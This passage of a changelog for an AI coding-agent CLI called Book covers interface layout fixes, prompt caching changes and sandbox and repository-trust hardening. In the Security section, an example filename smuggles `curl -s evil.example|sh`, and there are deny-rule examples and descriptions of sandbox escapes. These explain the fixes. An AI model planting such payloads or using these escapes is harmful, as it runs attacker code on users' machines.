  about what to do instead. Because `/review` runs for minutes and looked idle the whole time, the
  natural thing to do — start another turn — silently threw away the entire review report. Blocked
  messages are now queued and replayed in order once the turn ends; a message owed to a
  conversation the user has since left is still dropped, deliberately.
- **Esc cancels a running review; Ctrl+C no longer exits the app during one.** Neither key treated a
  review as in-flight work, so Esc was a documented no-op and Ctrl+C fell through to session exit —
  killing Book and orphaning the agents the review had spawned. Both now cancel the review, which
  stops its in-flight agents; a second Ctrl+C still exits, exactly as it does mid-stream. A
  cancelled review reports `inconclusive` with no findings rather than presenting the coverage
  failure from its own stopped agents as a result, and a cancelled `--fix` pass reports what it had
  already committed before stopping.
- **A running tool row no longer shifts a column when it finishes.** `Spinner` already emits its
  own trailing space and the row added a second one, so a running row's gutter was three columns
  and a finished one's was two — the verb and everything after it jumped left the instant the tool
  completed, which is the single-column invariant the grid exists to hold.
- **Our width model agreed with the renderer for `✓`.** The width table marked the whole Dingbats
  block as two columns wide, but it also holds the East-Asian _ambiguous_ marks — `✓`, `✗` — which
  terminals and Ink's own layout render one column wide. The block is now narrowed to its
  emoji-presentation members, and a test pins every status glyph's width against the renderer.
- **The branch shows when `book` is launched from a subdirectory.** Repository detection probed for
  a `.git` entry, which only exists at the repository root, so the footer's new branch segment was
  silently absent anywhere below it. `git rev-parse` now decides.
- **A malformed custom theme no longer crashes the TUI on the first spinner frame.**
  `.book/themes/*.json` is merged into the token set without validation, so a `shimmerPair` that is
  empty, short, or not an array reached the interpolator and threw.
- **Context pressure survives a narrow footer.** Segment packing skips what does not fit and keeps
  later, shorter segments, so `ctx 5%` was dropped while the branch behind it was admitted — losing
  the one figure the row exists to show. The label drops before the number does.
- **A reasoning tag inside a fenced code block stays in the answer.** Tag splitting ran before
  markdown parsing with no fence awareness, so an answer quoting a prompt template had that region
  torn out and rendered as a collapsed thought, silently emptying the code block.
- **`Bash` rows are not painted in the dim path colour.** The directory/basename brightness ramp
  assumed a filesystem path, but a `Bash` target is a command: `npx vitest run src/tui/` split at
  the trailing slash, leaving an empty basename and rendering the row's only content at its
  faintest. The ramp now applies to real paths only.
- **The status line and working indicator share the transcript's 120-column cap.** Both still sized
  themselves from the raw terminal width, so on a wide terminal the footer spread across the full
  screen while everything above it stopped at the measure.
- **The status-line git poll no longer re-renders the app every five seconds.** `useGitStatus`
  allocates a fresh status object per tick and returned it unconditionally, so wiring it into the
  footer made the whole tree reconcile twelve times a minute in an idle session for no visual
  change. It now keeps the previous object when the branch, tree and error are unchanged.
- **The virtual transcript estimates row heights against the measure it actually renders at.** The
  estimator wrapped against the raw terminal width, so on a terminal wider than the 120-column
  measure every off-screen message was estimated at roughly 60% of its true height, drifting scroll
  position and the "older entries hidden" threshold. A user turn's rule row is counted too.
- **An inline-label tool row no longer clips its target early.** The width budget subtracted the
  verb's width from a string that already contained the verb, so a narrow-terminal row lost exactly
  that many characters off its command and padded the columns back as spaces.
- **Heading depth is legible again.** `mdHeadingH1` had been set to the body text colour, so with
  the `###` markers gone `# Title`, `### Sub` and a bold run of body copy all rendered identically.
  The three heading steps are now distinct in both built-in themes, and a test enforces it.

### Changed

- **The activity wording is shorter, funnier, and covers the whole tool set.** The row is one line
  and the label shares it with an elapsed time and a keyboard hint, so a phrase is only the frame —
  the target inside it, a path or a pattern or a shell command, is the part worth reading.
  `Peeking between the covers of` spent 29 of about 50 columns on the joke and then truncated the
  filename it was introducing; every phrase now fits a 28-column budget a test enforces, and the
  short ones land the gag sooner. The reasoning rotation grew from twelve lines to twenty-eight, so
  a minute of thinking no longer loops, and each line is a joke about thinking rather than a claim
  of progress the indicator cannot check. Phrases moved out of the switch into one catalog that can
  be read in a single sitting, and the tools that used to fall through to `Trying agent spawn on…`
  — the managed-agent and evidence families, `ToolSearch`, `ReadSkillResource`, `DismissShell` —
  now have their own. `ApplyPatch` names the file its envelope touches instead of saying
  `workspace files`, and a phrase that ends in a colon drops it when the call carries no target.
  The blocked labels stay plain: when the run has stopped to ask the reader for something, a joke
  is in the way.
- **The plan block and the working line are now told apart at a glance.** The activity row used to
  set its wording in `text`, the same colour as body prose, plan steps and tool targets, so the one
  row that is actually changing was the hardest row to pick out: a moving glyph welded to a sentence
  that looked like every other sentence. The spinner glyph and its wording now share the spinner's
  own sage — the agent's voice — and read as a single live element, with the elapsed duration and
  the keyboard hint receding behind it in two quieter weights. Blocked and retrying rows keep their
  status colours, because those are not the agent talking. The plan takes clay, product chrome's
  hue, so the two blocks never compete. Its header carries a meter of one cell per step, a scale
  model of the rows beneath it, and the rows themselves run in three weights: finished steps struck
  through and receded, queued steps quiet, the step in flight the only one set in full text colour
  and bold. Plan markers moved off `○`/`◉`, which are East Asian _Ambiguous_ — terminals that draw
  them two cells wide swallowed the space behind them, so plan rows landed a column left of every
  other row and butted against their own marker — onto the `✓`/`›`/`·` vocabulary the rest of the
  TUI already renders one cell wide. A long step now truncates to the content measure instead of
  wrapping back under the marker column, where the overflow read as a new item.
- **Zero-Mem is now an explicitly named experiment and is unavailable by default.** Production
  `compactStrategy` accepts only `summary`; the normal `/config` menu, `R` shortcut, and
  `/config compact-strategy` selector no longer expose Zero-Mem. Activation requires strict
  `BOOK_EXPERIMENTAL_ZERO_MEM=true`, `experimental.zeroMem: true` in the user-global
  `<BOOK_HOME>/settings.json`, or an explicit `--settings` document. Both workspace settings layers
  are withheld from enabling experimental capabilities so a clone cannot opt the user in, and local
  `/config`/`book config set` writes refuse the key rather than pretending it will take effect.
  Legacy `compactStrategy: "zero-mem"` and `BOOK_COMPACT_STRATEGY=zero-mem` selectors fail with
  migration guidance; explicitly enabled main-agent runs keep query-time retrieval while subagents
  retain summary compaction.
- **The TUI now lays every row out on one grid, and the palette gives every role its own hue.**
  A transcript row is `[gutter][content]`: the gutter is two columns wide and carries status (a
  glyph, a rail, a spinner), and content always begins on the same column. Before this, each
  component picked its own `marginLeft` and its own `width - N` budget, so content landed on
  columns 1, 2, 4 and 5 and nothing could be scanned down. `src/tui/layout.ts` is the single
  source of truth; bordered surfaces (composer, menus, permission prompt) now sit flush at column
  0 so their border plus one column of padding lands their text on the same content column.
  - _Tool rows are three aligned columns_: `[verb] [target] … [meta]`, with metadata flush right
    so `8 lines`, `+3 -2` and `exit 1` line up down the transcript instead of trailing a
    `·`-chain. The verb is never truncated — a row whose label will not fit the column runs
    inline instead. A failing row may spend up to half its width on the error message, which
    previously got clipped to twenty columns while the command it failed on kept the rest.
  - _Consecutive tool rows no longer have a blank row between them_ (`toolRowGap` is 0, and the
    new `toolBlockGap` puts the breathing room before the block), so a run of actions reads as
    one column.
  - _A user turn opens with a labelled rule_ — `── you ─────── 10:55 ──` — replacing the tinted
    card with an accent rail. A transcript with no turn boundary is a wall of same-weight rows;
    this is the element that lets you find where an exchange began when scrolling back.
  - _Code blocks lost their four-sided border_ in favour of a left rail plus the code tint. The
    box was the heaviest element in an answer, wrapped around its smallest, and cost four columns
    where the rail costs two. Full borders are now reserved for surfaces that want your input.
  - _Headings carry hierarchy through weight and brightness_, not `═══ TEXT ═══` / `── text ──`
    side chrome, which competed with the turn rule and made an in-answer heading look like a
    transcript boundary. `# Heading` is no longer upper-cased.
  - _List markers are sized per list_ rather than to a fixed three columns, so a bullet no longer
    leaves a dead column and an ordered list does not shear its text between items 9 and 10.
- **The palette separates roles that used to share one colour.** `#AFC19D` was simultaneously
  `brand`, `assistantAccent`, `modeDefault`, `mdHeadingH1`, `mdLink` and `usageMeter` — six
  semantically different things rendering identically. Sage now belongs to the agent, clay to
  product chrome and user-authored content, teal to references and the usage meter, and the
  amber/rust/green trio to status; `default` permission mode is desaturated so an agent turn never
  reads as a mode signal. Both the dark and light built-ins are checked for role distinctness by
  test rather than by pinned hex values.
- **The status line leads with what matters and shows the branch.** `useGitStatus` existed with no
  consumer; the footer now shows the current branch and marks a dirty tree, leads with a mode chip
  in the mode's own colour, and always colours context pressure (previously grey until 80%, which
  left the whole row a flat monotone). Segments are separated by space rather than `·`, since
  colour now does that work.
- **The transcript reads as a hierarchy instead of a flat list.** Tool rows and answer prose
  rendered at the same weight, so in a session that is mostly machinery the conclusion had to be
  hunted for. There is now a ramp: headings brightest, prose next, tool targets a step below, and
  verbs and directory prefixes dimmest. A path's basename outranks its directory, since twenty rows
  of `src/review/` are identical and the filename is what distinguishes them.
  - _A finished thought collapses to `▸ thought · 4 lines`._ Watching reasoning arrive is the point
    of showing it; re-reading it in scrollback is not. Expanded by default it put the least
    important content of a turn several rows above the first sentence of the answer. Live reasoning
    still streams in full, and detailed mode (Ctrl+O) reopens a finished one.
  - _The `answer ────────` divider is gone._ It announced the answer only when the turn happened to
    contain reasoning, and trailed a stub rule that went nowhere. Screen readers keep the spoken
    boundary, which they cannot infer from spacing.
  - _Byte counts and whole-file line ranges are gone._ `2 lines, 51 B` and `121 lines · 1-121` rode
    along on nearly every row; the range now appears only when a read started partway into a file.
  - _Churn counts are coloured_ — `+33` green, `-2` rust — so the figures a reader scans for are the
    ones that carry colour.
  - _A file edit is called `Edit` everywhere._ `deriveToolPresentation` said `Update` while the
    aggregate heading said `Edit`, so the measured label column disagreed with the rendered one.
  - _Label-column widths snap to 4, 6 or 10_ rather than each turn's exact widest label. Exact
    per-turn sizing closed the gulf inside a turn but left two adjacent turns on different columns.
- **The transcript is capped at a 120-column measure.** On a wide terminal nothing bounded the
  row width, so prose ran to 190 columns and right-aligned metadata ended up 170 columns from the
  command it described — aligned with nothing the eye could hold. The transcript, the composer and
  the status line now share one maximum measure and sit left-aligned beyond it.
  - _The label column is sized per turn_ rather than to a fixed ten columns. A turn of `Bash` /
    `Read` / `Grep` rows left seven dead columns between every verb and its target.
  - _A failing row now takes as much width as its message needs_, capped, and never enough to
    push the target below a readable minimum. The previous half-the-width ratio clipped
    `'tail' is not recognized as an internal or external command` by one character.
  - _Reasoning tags beyond `<think>`_ (`<thinking>`, `<reasoning>`, `<reasoning_context>`) are
    recognized. An unhandled tag reached `marked` as raw markup, so the transcript grew a code
    block labelled `html` containing the model's private reasoning.
  - _Thinking blocks lost their fill_, keeping only the rail. Reasoning is the least important
    content in a turn and was rendering as the heaviest block on screen.
- **Left rails now actually render.** Expanded tool output, blockquotes and thinking blocks each
  set `borderLeft` and a border colour but never a `borderStyle`, which Ink treats as no border at
  all — so `toolRail`, `mdBlockquoteBorder` and `mdThinkBorder` were configured and never drawn.
  Those blocks were indistinguishable from indented prose.
- **The welcome screen no longer advertises commands that do not exist.** Hints were truncated per
  segment inside a row that also held fixed separators, so a 50-column terminal rendered
  `/hel commands` and `·@file`. Hints are now packed whole — the last one is dropped rather than
  clipped — and the tagline orients a first-run user instead of describing the product.

- **Anthropic sessions now cache the conversation, cutting input cost on long sessions by roughly
  an order of magnitude.** Book placed no cache breakpoint on the message stream, so the whole
  history — 50-150k tokens mid-session — was re-billed at full input price on every turn. A moving
  breakpoint on the newest message means a steady-state turn re-buys roughly the newest turn
  instead of the whole context; cache reads are about a tenth of the input price, and time to first
  token drops with the cost. Book also marked _every_ tool definition, far past Anthropic's
  four-breakpoint limit; only the last tool is marked now, which caches identically.
- **The system prompt is now organized by how often its content changes.** Current date, git
  status, the plan-mode notice, and the todo list have left the system prompt: they sit ahead of
  the message history in the cache prefix, so a dirty file or a plan-mode toggle used to
  invalidate the entire conversation. Per-turn state is delivered as a `<session-state>` block on
  the newest user turn, and active skill frames moved from the cached prefix to the uncached
  dynamic suffix, so activating a skill no longer invalidates the whole prompt.
  - _Todo state now travels through TodoWrite's own tool result_, which already echoes the full
    list into the message stream. The list is no longer restated in the system prompt each turn.
  - _Checkpoint freshness_ is no longer re-stamped into the historical checkpoint message. The
    same hash comparison runs once per turn and reports drift as `Stale since checkpoint: …` in
    the newest session-state block.
- **`SYSTEM_PROMPT_VERSION` is now `book-system-prompt-v2`.** Run-ambient records stamp this
  version, so harness evidence recorded under v1 is not comparable with v2-era runs. Evidence
  accumulated through a durability backend that claims `verified` is reset by this bump.
- **Project instructions are fenced.** `CLAUDE.md` / `AGENTS.md` / rules content is wrapped in
  `<project-instructions>` with a `<source path scope>` element per file, and fence markup inside
  a source body is neutralized. Previously an injected file's own `#` headings broke straight out
  of the `## Project instructions` section, so a repo file containing `## Guardrails` rendered at
  the same level as the real one. Trust framing now precedes the fenced content instead of
  arriving in the closing guardrails.
- **The system prompt states harness facts it never used to**: how output is rendered, the
  `file_path:line` convention, which shell Bash spawns per platform (`cmd.exe` on Windows, not a
  POSIX shell), what a denied tool call means, that hook output is user-configured feedback, and
  that time-sensitive facts need verifying. The machine hostname is no longer sent to the provider.
- **The `## Available tools` section is gone.** It restated, with truncated descriptions, the tool
  schemas the API already delivers verbatim. The deferred-tool catalog remains, since it describes
  tools the model genuinely cannot see. Operating principles lost the bullets that restate a
  frontier model's own defaults.
- **Truncated listings now say so.** Command and subagent listings that hit their character budget
  append `- …and N more not shown` instead of stopping silently after one bare name. The skills
  listing already reported its omissions.
- **Node.js 22.13.0 or newer is now required** (previously 20). Node.js 20 reached end-of-life on
  2026-04-30, and 22.13.0 is where `node:sqlite` stopped requiring `--experimental-sqlite`. CI
  exercises Node.js 22 and 24 on Ubuntu and Windows.

### Security

- **A repository can no longer approve its own slash commands by committing
  `.book/settings.local.json`.** Project command approvals were the last of four
  repository-controlled input classes still read from inside the working tree. `.gitignore` does
  not stop a _tracked_ file from reaching a clone, so `git add -f .book/settings.local.json`
  shipped a project's own `commands.projectCommands` decisions with it — and because the
  fingerprint they carry is a digest of a body the repository also wrote, a hostile project could
  precompute a matching one and arrive pre-approved, releasing its shell on the first `/name` or
  `book -p "/name"`. Decisions now live in `~/.book/trust.json` alongside the MCP, allow-rule, and
  hook decisions, keyed by workspace path, and **both** workspace settings layers are stripped of
  the key. Record one with `book trust command <name>` (`--all-pending`, `--reject`, and
  `--workspace` all work as they do for `hook` and `rule`); `book doctor` prints the line for what
  is withheld. Approvals previously recorded in `.book/settings.local.json` are not migrated —
  reading them back to convert them is the same trust the move exists to withdraw — so each is
  asked once more, on the machine that decides.

- **`book config set` refuses the four trust-owned settings paths.** They are stripped from the
  layer `config set` writes, so `book config set commands.projectCommands …` — the line Book
  itself used to print — would report success and change nothing on the next load. It now exits
  non-zero and names the `book trust` command that records the decision instead. The refusal
  matches ancestors and descendants of each path, not just the exact key: replacing a whole
  section with `book config set commands '{"projectCommands":…}'` is the same silently-stripped
  write by another route.

- **A project command is never approved by name alone.** `book doctor` now lists each withheld
  command with the shell it would run, the way it already lists a withheld hook's command,
  matcher, and environment, and `book trust command --all-pending` prints each command's shell
  before recording the grant — a bulk decision against a list of names was approval without
  reading. A command's name is a filename the repository chose, so it is also now stripped of
  terminal control characters wherever it is displayed, and a name that is not a plain filename
  gets no copy-and-paste `book trust command <name>` line at all: a repository shipping
  ``.book/commands/deploy`curl -s evil.example|sh`.md`` would otherwise have had its payload
  printed as a command to paste, and run by the act of approving.

- **The trust store version is now 2.** `projectCommands` is readable by a version-1 build, which
  is the problem: writes go through the schema, unknown keys are dropped, and a version-1 build
  recording any hook, rule, or MCP decision would silently erase that workspace's command
  approvals. A version-1 build now reports a version-2 store as unreadable, withholds every gated
  declaration, and declines to write, rather than quietly discarding decisions.

- **A checked-in slash command can no longer run shell on your machine just because you typed
  its name.** A `.book/commands/*.md` body may substitute shell output into its prompt, and that
  substitution ran before the model saw anything, outside the permission system and outside the
  sandbox — no rule consulted, no sandbox applied, nothing asked. Cloning a repository and
  invoking one of its commands was therefore arbitrary code execution, and print mode had widened
  the exposure: `book -p "/name"` reaches the same resolver with no terminal present to notice.
  Repository-declared commands that substitute shell now require a one-time decision, recorded in
  `~/.book/trust.json` and keyed by workspace path, so nothing inside the working tree can answer
  for it. Until a
  decision exists the command is refused, naming the shell it wanted to run and the command that
  approves it; `book doctor` lists what is withheld. The recorded fingerprint covers the shell a
  body runs, not the prose around it, so editing what runs asks again while rewording the
  instructions does not. Commands in `~/.book/commands/` are yours and are never gated, and a
  project command that substitutes no shell is unaffected.

- **Slash-command shell output is no longer rescanned for further substitution.** Fenced blocks
  were resolved first and the _result_ was then scanned for inline ``!`cmd` `` spans, so a block
  whose output contained an injection marker had it executed as a second command. Spans are now
  taken from one scan of the original body and output is substituted back without rescanning —
  which is also what lets an approval fingerprint mean exactly what will run.
- **A repository can no longer widen your permissions by shipping a `permissions.allow` rule.**
  Allow rules accumulate across settings layers, so a rule in a cloned repository's checked-in
  `.book/settings.json` joined the effective allow list — reaching the outcome that project layers
  are already forbidden from selecting via `defaultMode: bypassPermissions`. Once merged a rule
  carried no provenance, so nothing downstream could tell a repository's grant from your own. Such
  rules are now withheld until you record a decision, stored per workspace in `~/.book/trust.json`.
  `ask` and `deny` rules are unaffected: they only ever restrict. `book doctor` lists what is
  withheld and prints the `book trust rule` command that grants it.

- **A repository can no longer run shell commands through project-declared hooks without your
  approval.** A `hooks.<event>` entry in a cloned repository's checked-in `.book/settings.json`
  is a command Book executes at lifecycle events — on every prompt, around every tool call, at
  session start. Once merged into resolved settings an entry carried no provenance, so nothing
  downstream could tell a repository's hook from your own. Project-declared entries are now
  withheld until you record a decision, stored per workspace in `~/.book/trust.json` and keyed by a
  fingerprint of the event, matcher, command, and env — editing any of those reverts the hook to
  untrusted. User-global and local-layer hooks are unaffected. Print/headless and SDK runs report
  what they are skipping, and `book doctor` lists each withheld hook — command, matcher, and
  environment, since approval covers all three — and prints the `book trust hook` command that
  grants it.

- **Trust decisions moved out of the workspace, into `~/.book/trust.json`.** `mcp.projectServers`,
  `permissions.projectAllowRules`, and `hooks.projectEntries` recorded your answer about
  repository-controlled input, and were read from `.book/settings.local.json` on the reasoning that
  the file is gitignored. `.gitignore` does not stop a _tracked_ file from reaching a clone:
  `git add -f .book/settings.local.json` ships it with the repository, and every fingerprint the
  store is keyed by is a digest of configuration the repository already controls. A hostile project
  could therefore precompute approvals for the hooks, servers, and allow rules it also shipped and
  arrive pre-trusted — releasing arbitrary shell commands on first run. All three keys are now
  ignored from **both** workspace layers and read from a user-global store keyed by absolute
  workspace path, which nothing a repository can write reaches. An unreadable or off-schema store
  records no decisions, withholding the gated input rather than releasing it, and a write refuses
  rather than overwrite a store it could not parse. Decisions recorded under the old scheme are not
  migrated — that would import exactly the approvals this closes — so a project whose hooks or
  servers you had already approved asks once more.

- **New `book trust` subcommand records those decisions**: `book trust hook <fingerprint>` and
  `book trust rule <rule>`, each taking `--all-pending`, `--reject`, and `--workspace <path>`.
  `book doctor` printed a `book config set hooks.projectEntries '<json>'` one-liner to paste, which
  was wrong three ways: `config set` _replaces_ the value at a path and the printed map held only
  the newly pending entries, so running the suggestion silently revoked every earlier approve and
  reject; the command omitted `--workspace`, so running it anywhere but the diagnosed directory
  wrote the decision into the wrong project; and its single-quoted JSON does not survive `cmd.exe`,
  where quotes are literal and the argument reached validation as a string. Decisions are now
  recorded one at a time, a fingerprint needs no quoting, and doctor names the workspace it
  diagnosed. Repository-authored text in that report — commands, matchers, environment values — is
  escaped before printing, so a hook cannot use newlines or ANSI escapes to forge a report line and
  pass itself off as already approved.

- **Print/headless and SDK runs no longer report withheld project declarations under
  `--no-settings`.** Both hosts read `.book/settings.json` off disk unconditionally and compared it
  against the resolved decision store, which under `--no-settings` is the empty default: a run in a
  repository with project hooks announced that it was ignoring hooks pending approval, when the
  hooks were skipped because settings layers were disabled and approving them would change nothing.
  Already-approved hooks were reported as pending for the same reason.

- **`connectMcpServers()` now fails closed when no host has adjudicated approval.** Called without
  an explicit server list it resolved every declared server — user-global _and_ repository-declared
  — and connected them all, so the project-server approval gate held only because each caller
  remembered to pass an approved subset. It now connects user-scoped servers only and reports each
  project-declared server it refused, by name and config path. No shipped caller changes behavior:
  the TUI, headless, and SDK paths all supply an explicit list already. What changes is that a
  future caller cannot reach a repository-controlled server by omitting an argument.

- **`permissions.deny` rules now hold in every permission mode.** The hard-deny check ran only for
  file-mutating tools, and `auto` and `bypassPermissions` skip the permission block entirely — so
  in those two modes a deny rule was enforced for `Write` and `Edit` and silently ignored for
  everything else. `deny: ["Bash(rm *)", "Write(.env)"]`, the pair in the README's own settings
  example, was half-enforced under `--permission-mode auto`: the `Write` rule blocked, the `Bash`
  rule matched nothing. The deny check now runs for every tool ahead of the mode logic, so a rule
  the user already wrote is applied whether or not the mode would have prompted. Modes still decide
  only what happens to calls no deny rule matched.
- **The Bash sandbox now actually contains the command it wraps.** The bubblewrap invocation was
  joined into a single string and spawned with `shell: true`, so the host shell re-parsed the whole
  wrapper — including the user's unquoted command — before bubblewrap ever ran. Any metacharacter
  (`;`, `&&`, `|`, `$(…)`, a backtick) split at the outer level and executed on the host, outside
  the sandbox; a workspace path containing a space broke the invocation outright. Sandboxed
  commands are now spawned as a direct argument vector with `shell: false`, and the command reaches
  `/bin/bash -c` inside the sandbox as one argv element. Shell syntax still works — it is parsed by
  the shell _inside_ the namespace. This covers all three spawn paths: foreground `Bash`, session
  background shells, and persistent jobs through the detached runner.
- **Declared sandbox filesystem and network policy is now enforced instead of ignored.**
  `sandbox.filesystem.allowWrite`, `denyWrite`, and `denyRead` were accepted by the schema and
  never read; the builder took the settings as an unused parameter and always emitted
  `--share-net`. They now render as `--bind`, `--ro-bind`, and masking `--tmpfs` mounts applied
  after the workspace bind so explicit policy wins. Because bubblewrap has no per-domain
  filtering, any `sandbox.network` domain rule now fails closed to `--unshare-net` with a warning
  rather than silently granting the full host network.
- **The sandbox binds the workspace root, not the caller's `workdir`.** `workdir` is a
  model-supplied `Bash` argument, and it used to be the directory the sandbox mounted writable.
  Combined with the mount reordering below, `workdir: "/"` would have emitted `--bind / /` after
  every default mount, shadowing all of them and returning the entire host filesystem read-write
  while the output was still labelled `[sandboxed]`. A sandboxed command whose `workdir` resolves
  outside the workspace is now rejected; extra directories go through `sandbox.filesystem.allowWrite`.
- Sandboxed commands run with `--die-with-parent` so a contained tree cannot outlive the process
  that spawned it. `--new-session` is deliberately not used: it calls `setsid()`, which moves the
  sandbox into its own process group, and every teardown path (`KillShell`, foreground timeout,
  Ctrl-C) signals the group Node created and confirms death with `kill(-pgid, 0)` — the group would
  have read as empty while the command kept running.
- Fixed a mount-ordering bug that made the workspace read-only or invisible when it lived under a
  system prefix or under `/tmp`: the workspace bind was emitted before the read-only system binds
  and the `/tmp` tmpfs, which then shadowed it. The workspace is now bound after both.
- `sandbox.filesystem.denyRead` masks a file with `/dev/null` and a directory with a tmpfs. Using
  a tmpfs for both would have aborted every sandboxed command with `Can't mkdir …: Not a directory`
  whenever the denied path was a file — which is the most natural thing to deny.
- `sandbox.filesystem` entries may start with `~`, which is now expanded. Previously `~/.ssh`
  resolved to a nonexistent `<cwd>/~/.ssh` and was skipped in silence, leaving the path unprotected
  while the setting suggested otherwise. Unapplicable entries are now reported at startup and by
  `book doctor`, which also prints the policy the sandbox is actually enforcing.
- The persistent job runner refuses to start a spec whose `sandboxed` flag disagrees with the
  presence of a sandboxed argv, instead of silently running the command unconfined.
- **`sandbox.allowUnsandboxedCommands` and `sandbox.autoAllowBashIfSandboxed` are enforced instead
  of merely validated.** Both keys were accepted by the settings schema and read by nothing:
  sandboxing granted no permission auto-allow, and `allowUnsandboxedCommands: false` refused
  nothing, which left `sandbox.excludedCommands` as the only sandbox setting that had any effect.
  Both now decide from one shared predicate — will this exact command really execute inside a
  bubblewrap namespace? — so they cannot disagree about a command. `allowUnsandboxedCommands: false`
  refuses any `Bash` command that would run outside the sandbox, covering all three escapes
  (sandboxing off, an `excludedCommands` match, a missing backend), and the refusal names the
  setting and the specific reason rather than denying bare. `autoAllowBashIfSandboxed: true` skips
  the prompt only for a command that genuinely runs inside the sandbox, and only in place of the
  _default_ ask: `permissions.deny` is evaluated first and is never softened, an explicit
  `permissions.ask` rule still prompts, and any configured deny/ask rule at all keeps the default
  ask — a shell line escapes a glob far too easily for the rules that happened to match to be the
  whole protection. `sandbox.enabled` still defaults to `false`, so nothing changes for anyone who
  has not opted into sandboxing. `book doctor` now prints the effective — not merely configured —
  state of both keys alongside the `excludedCommands` count, reporting an auto-allow that cannot
  bite as inert instead of as enabled policy.
- Raised the `postcss` override from `8.5.18` to `8.5.26`, clearing CVE-2026-69153
  (GHSA-fxqj-rqcc-2cmp, moderate): an attacker-controlled `sourceMappingURL` could read arbitrary
  `.map` files when `opts.from` was unset. `postcss` is a build-time-only transitive dependency of
  `tsup` and `vite`, so no shipped runtime code was affected. The pin, added for CI dependency
  stability, was holding `postcss` below the `^8.5.25` floor `vite` already declares; it stays an
  exact pin.

### Fixed

- **`--workspace` acted on the current directory instead, in whichever placement you used.** The
  root command and every subcommand both declare `-w/--workspace`; under commander 15 a `-w`
  following a subcommand is routed to the root, leaving the subcommand on its `process.cwd()`
  default. `book doctor`, `config`, `mcp`, and `tool-stats` all reported on the wrong directory, and
  `book config set --workspace <path>` wrote settings into the current one. Enabling positional
  option parsing fixes the after-subcommand placement, but it splits the two placements across
  different command objects, so `book --workspace <path> <subcommand>` was still silently ignored —
  the same silent-wrong-directory hazard, just moved to the placement most people reach for first.
  The subcommand option no longer defaults to `process.cwd()`, so an unset one falls through to the
  root's value: all three placements — before the subcommand, after it, and after its positional
  arguments — now name the same directory. The CLI tests asserted only exit status, so the original
  regression arrived green with the commander 14 to 15 bump; they now assert the flag has an effect
  in every placement, and pin a marker into a workspace distinct from the fake `HOME` so an ignored
  flag cannot be rescued by the user-global layer resolving to the same file.

- **Root options written after a subcommand name became errors.** Positional option parsing rejects
  a root option that follows the subcommand, so `book config get model --settings <path>` started
  failing with `unknown option '--settings'` — an undocumented break, and a natural invocation,
  since the `config` action deliberately reads the root's `--settings`. `--settings` and
  `--no-settings` are re-declared on `config`, which prefers its own value and falls back to the
  root's; both flags work on either side of the subcommand again.

- **Running the CLI test suite could write settings into the repository.** The tests spawned the CLI
  from the checkout, so a bug that dropped `--workspace` wrote into the developer's real
  `.book/settings.local.json`; the guard meant to catch it skipped itself whenever that file already
  existed, which is the documented normal state for that scope — inert on exactly the machines that
  needed it. The child now runs from a scratch directory, so a stray write structurally cannot reach
  the repository, and the assertion fires everywhere.

- **`book doctor` now runs without a working credential.** Doctor resolved its config through the
  throwing `loadConfig`, so the single most common broken environment — no `BOOK_API_KEY` — killed
  it with an unhandled stack trace before it reached the `BOOK_API_KEY: (not set)` line it was
  about to print. The command a user reaches for when nothing works now reports a missing
  credential as a finding (`Credentials: not resolved`) instead of dying on it. A new
  `src/cli/subcommands.contract.test.ts` holds every non-interactive subcommand — `doctor`,
  `config`, `mcp list`, `tool-stats` — to running with no API key configured, so the class of
  regression cannot come back through another command. That guard covered only the missing
  credential, though: every other rejection — malformed JSON, a schema violation, an unknown
  `harness.workflow` — still escaped as a raw stack trace, which is the least useful possible
  response from the command whose job is diagnosing a broken setup. A configuration that will not
  load is now reported as `Configuration: FAILED TO LOAD` with the reason and the settings layers
  in the order they apply, so the offending file is named.

- **The `Stop` hook fires once per run instead of once per provider turn.** It ran inside the turn
  loop, so a task that took twelve tool-call turns invoked it twelve times — a hook meant to
  observe "the agent finished" observed "a round-trip finished". It now runs after the loop exits,
  once the terminal outcome is settled and before `SessionEnd`. Subagents no longer fire it at all:
  `Task` and managed agents run the same loop with the parent's hook config, and managed agents
  already report through `SubagentStop`, so one prompt that spawned three managed agents fired
  `Stop` four times — three of them naming a worktree as the workspace.
- **`Stop` and `SessionEnd` now fire when a run is cancelled, and no longer warn on every Ctrl-C.**
  Both passed the run's abort signal to `runHooks`, which calls `signal.throwIfAborted()` ahead of
  its empty-hook-list guard. A cancelled run therefore skipped the hooks and logged
  `Stop hook failed: AbortError` — including for the majority of users who configure no terminal
  hooks at all. Cancellation is when a "the agent stopped" hook matters most, and neither hook has
  anything left to cancel by the time it runs, so neither takes the signal now.
- **A denied skill activation no longer leaves a consent request open forever.** When a
  `permissions.deny` rule blocked an `InvokeSkill` call, the loop returned without the
  `denyConsent` that the interactive deny path performs, so `/skills` and the skill diagnostics
  showed a `skill_consent_requested` event with no resolution.
- Hook events are documented in the README for the first time: which are awaited (all but `Stop`,
  and `SessionStart`/`SessionEnd` on the one-shot SDK path), and which can actually change the
  outcome. `PostToolUse` is awaited and rewrites tool output — it cannot veto a call, but a slow
  one delays every tool call by up to the 10 s hook timeout.
- **The skill watcher no longer aborts the process on Windows when the workspace is reached through
  a short path or junction.** `fs.watch` was handed the path as given, but Windows reports
  directory-change events under the volume's canonical path, and libuv asserts the two match
  (`!_wcsnicmp(filename, dir, dirlen)` in `src/win/fs-event.c`). Watching a path with an 8.3 alias
  such as `C:\Users\RUNNER~1\…` failed that assertion, and a failed libuv assertion calls `abort()`
  — so the CLI died with no catchable error, and no `onError` handler could have caught it, as soon
  as a watched skill directory changed. Watched directories are now canonicalized with
  `realpathSync.native` first. POSIX behavior is unchanged. This was also the cause of the
  long-standing `Check (windows-latest, Node 24.x)` CI failures, where every test passed but two
  vitest workers exited unexpectedly: the runner's `%TEMP%` is an 8.3 alias, so the two tests that
  open real watchers aborted their workers.
- The skill watcher no longer reopens every directory handle each time a skill file changes. A
  debounced rebuild now closes only the watchers whose directories left the watched set and opens
  only newly in-scope ones, instead of closing and reopening all of them. The old churn cost one OS
  directory handle per watched directory on every save, which is wasteful on every platform and
  worst on Windows, where each handle is a separate `ReadDirectoryChangesW` registration.
- `SessionRuntime` now threads one set of skill-discovery options through both the skill registry
  and the skill watcher (`skillDiscoveryOptions`), so the two cannot disagree about which roots
  exist and tests can pin discovery inside a temp workspace instead of the real home directory.
- `/review` no longer reports a clean review when it silently discarded findings. A reviewer pass
  whose report envelope parses but whose individual findings fail the per-finding contract (missing
  evidence, failure scenario, suggested fix, or a numeric confidence) is now recorded as `partial`
  rather than `completed`: the dropped count is reported in the coverage warning, the verdict is
  capped at `inconclusive`, and the reviewer's raw output is preserved so the lost findings are
